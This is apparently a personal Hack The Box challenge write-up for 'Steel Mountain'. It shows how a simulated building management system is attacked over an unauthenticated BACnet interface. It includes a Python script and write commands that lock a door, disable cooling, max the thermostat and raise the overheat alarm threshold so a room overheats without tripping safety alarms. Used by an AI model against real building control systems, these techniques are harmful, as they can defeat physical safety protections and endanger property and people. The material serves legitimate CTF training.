---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "medium"
status: Documents
date_started: 2026-01-31
date_completed: 2026-01-31
tags:
  - htb
  - challenge
  - ics
  - scada
  - bacnet
  - bms
  - building_automation
---

# Steel Mountain

## Overview

**Category:** hardware
**Difficulty:** medium
**Platform:** Hack The Box
**Date:** 2026-01-31

> [!note] Challenge Scenario
>
> > Steel Mountain is a secure facility serving major corporations like E-Corp. We've infiltrated their network and planted our tool. Final step: Burn the tapes to destroy the data.

## Enumeration

The challenge provides two ports:
- **Port 48380**: Web dashboard (Werkzeug/Python) - Building Management System interface
- **Port 30551**: BACnet interface - Industrial control protocol

*Reference: Mr. Robot TV series - Steel Mountain episode, E-Corp, "burn the tapes"*

### Initial Reconnaissance

Port 48380 served a "Steel Mountain Dashboard" - a building management system (BMS) web interface showing:
- Temperature sensors for 3 levels
- Air Handling Units (AHU1, AHU2)
- Doors: Lobby Door, **Tape Storage Room Door (L2-TSR-DR)**, Servers Room Door
- Elevators and Air Conditioning units

Port 30551 was a BACnet (Building Automation and Control Networks) interface with a menu:
```
1. objects
2. bacnet.read
3. bacnet.write
```

## Vulnerability

### Understanding the BACnet Objects

The `/data` endpoint revealed BACnet objects controlling Level 2 (where tape storage is located):

| Object ID     | Type          | Name                 | Description                    |
| ------------- | ------------- | -------------------- | ------------------------------ |
| `Temp-L2-20`  | analogInput   | Temperature          | Current temperature on Level 2 |
| `Therm-L2-21` | analogOutput  | Thermostat           | Setpoint for heating/cooling   |
| `ACS-L2-22`   | binaryOutput  | AC Status            | 0: OFF, 1: ON                  |
| `OHAP-L2-23`  | analogOutput  | Overheat Alarm Point | Default 25C                    |
| `OHA-L2-24`   | binaryInput   | Overheat Alarm       | Alarm status                   |
| `L2-TSR-DR`   | multiStateOutput | Tape Storage Room Door | 0: OPEN, 1: CLOSED-UNLOCKED, 2: CLOSED-LOCKED |

### Attack Goal

To "burn the tapes", we need to:
1. Raise the temperature in the Tape Storage Room to destructive levels
2. Prevent safety systems from triggering
3. Keep the door locked to trap heat

## Exploitation

### Failed Attempts

1. **Lowering overheat alarm point + heating**: Triggered alarm -> "mission failed, try again"
2. **Raising alarm point + heating with door open**: Temperature rose to ~180C but no flag (heat escaped)
3. **Heating all levels**: L1 and L3 reached 400C+ but L2 kept resetting

### Key Insight

The **door needed to be CLOSED and LOCKED** to trap heat in the Tape Storage Room. The system also continuously tried to reset values, requiring persistent writes.

### Successful Attack Sequence

```python
#!/usr/bin/env python3
"""
Steel Mountain BACnet Exploitation
Burn the tapes by overheating the Tape Storage Room
"""

import socket
import time

HOST = "$RHOST"
PORT = 30551

def send_command(sock, cmd):
    """Send command and receive response"""
    sock.send((cmd + "\n").encode())
    time.sleep(0.1)
    return sock.recv(4096).decode()

def write_value(sock, obj_type, obj_id, prop, value):
    """Write value to BACnet object"""
    cmd = f"bacnet.write {obj_type} {obj_id} {prop} {value}"
    return send_command(sock, cmd)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    # Read initial menu
    print(sock.recv(4096).decode())

    # Attack loop - maintain settings as system tries to reset
    for i in range(100):
        # 1. Close and lock the Tape Storage Room door
        write_value(sock, 'multiStateOutput', 102, 'presentValue', 2)  # CLOSED-LOCKED

        # 2. Turn off AC on Level 2
        write_value(sock, 'binaryOutput', 22, 'presentValue', 0)  # AC OFF

        # 3. Set thermostat to maximum
        write_value(sock, 'analogOutput', 21, 'presentValue', 1000)  # MAX HEAT

        # 4. Raise overheat alarm point to prevent alarm
        write_value(sock, 'analogOutput', 23, 'presentValue', 1000)  # High threshold

        # Check temperature and messages
        send_command(sock, "bacnet.read analogInput 20 presentValue")

        time.sleep(1)
        print(f"Iteration {i}: Maintaining attack settings...")

    sock.close()

if __name__ == "__main__":
    main()
```

### BACnet Write Command Format

```
bacnet.write <object_type> <object_id> <property_name> <value>
```

Examples:
```
bacnet.write multiStateOutput 102 presentValue 2
bacnet.write binaryOutput 22 presentValue 0
bacnet.write analogOutput 21 presentValue 1000
bacnet.write analogOutput 23 presentValue 1000
```

### Result

After maintaining these settings, the temperature rose to ~84C and the flag appeared in the Message object:

```
HTB{REDACTED}
```

> [!info] Tools Used
>
> - `curl`
> - `netcat`
> - `python3`

## Key Techniques

1. **BACnet Protocol Exploitation**: Understanding BACnet object model and read/write operations
2. **BMS Manipulation**: Controlling building systems through automation protocols
3. **ICS Security**: Exploiting lack of authentication in industrial protocols
4. **Persistence**: Continuously writing values to overcome safety resets

## Flag

`HTB{...}`

## References

- [BACnet Protocol](http://www.bacnet.org/) - Building Automation and Control Networks
- [ASHRAE Standard 135](https://www.ashrae.org/technical-resources/bookstore/bacnet) - BACnet specification
- Mr. Robot S1E6 - Steel Mountain episode reference
- [ICS-CERT](https://www.cisa.gov/uscert/ics) - Industrial Control Systems security resources